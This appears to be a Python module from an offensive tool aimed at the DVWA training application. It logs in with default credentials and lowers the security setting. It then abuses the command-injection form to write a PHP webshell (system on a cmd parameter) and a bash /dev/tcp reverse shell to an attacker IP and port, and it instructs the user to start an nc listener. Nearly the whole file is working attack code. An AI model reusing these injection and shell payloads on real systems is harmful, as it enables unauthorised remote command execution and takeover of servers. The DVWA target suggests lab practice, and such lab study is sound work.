import requests
from datetime import datetime
import os
###################

class Module:
    def __init__(self):
        self.name = "file_upload"
        self.description = "Automated file upload via command injection (webshell / revshell)"
        self.target = "http://192.168.107.129"
        self.user = "admin"
        self.password = "password"
        self.upload_path = "/srv/dvwa/hackable/uploads"
        self.session = None

    def show_options(self):
        print("\nCurrent Module Options (file_upload):")
        print(f"  target       → {self.target}")
        print(f"  user         → {self.user}")
        print(f"  password     → {self.password}")
        print(f"  upload_path  → {self.upload_path}  (server-side path)\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip().lower()

        if cmd == "show options":
            self.show_options()
            return

        if cmd.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1]
            value = parts[2]
            if option in ["target", "user", "password", "upload_path"]:
                setattr(self, option, value.rstrip("/"))
                print(f"[+] {option} → {value}")
            else:
                print(f"[-] Unknown option: {option}")
            return

        if cmd == "upload_webshell":
            self.upload_webshell()
            return

        if cmd.startswith("upload_revshell"):
            parts = cmd.split()
            if len(parts) < 3:
                print("Usage: upload_revshell <your_ip> <port>")
                return
            self.upload_revshell(parts[1], parts[2])
            return

        print("Commands in file_upload module:")
        print("  show options")
        print("  set <option> <value>")
        print("  upload_webshell                  → simple webshell (?cmd=)")
        print("  upload_revshell <ip> <port>      → PHP reverse shell")

    def _ensure_logged_in(self):
        if self.session is None:
            self.session = requests.Session()
            login_url = f"{self.target}/login.php"
            r_get = self.session.get(login_url)

            token_marker = "name='user_token' value='"
            token_pos = r_get.text.find(token_marker)
            user_token = ""
            if token_pos != -1:
                start = token_pos + len(token_marker)
                end = r_get.text.find("'", start)
                user_token = r_get.text[start:end]

            login_data = {
                "username": self.user,
                "password": self.password,
                "user_token": user_token,
                "Login": "Login"
            }
            r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

            if "Logout" not in r_login.text:
                print("[-] Login failed")
                return False

            # Set low security
            sec_url = f"{self.target}/security.php"
            self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})
            self.session.get(f"{sec_url}?security=low")

            print("[+] Logged in + security set to low")
        return True

    def upload_webshell(self):
        if not self._ensure_logged_in():
            return

        # Safe, minimal webshell with correct quoting
        webshell_content = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
        safe_content = webshell_content.replace("'", "'\\''")

        cmd = f"echo '{safe_content}' > {self.upload_path}/shell.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        print("[+] Simple webshell uploaded")
        print(f"Access URL: {self.target}/hackable/uploads/shell.php?cmd=whoami")
        print(f"Verify file: cat {self.upload_path}/shell.php")

    def upload_revshell(self, attacker_ip, port):
        if not self._ensure_logged_in():
            return

        # Safe reverse shell with correct quoting
        rev_content = f'<?php system("bash -c \'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\'"); ?>'
        safe_content = rev_content.replace("'", "'\\''").replace("\\", "\\\\")

        cmd = f"echo '{safe_content}' > {self.upload_path}/rev.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        print("[+] Reverse shell uploaded")
        print(f"Trigger URL: {self.target}/hackable/uploads/rev.php")
        print(f"Start listener first: nc -lvnp {port}")
        print("Then visit the trigger URL in browser to get shell")
        print(f"Verify file: cat {self.upload_path}/rev.php")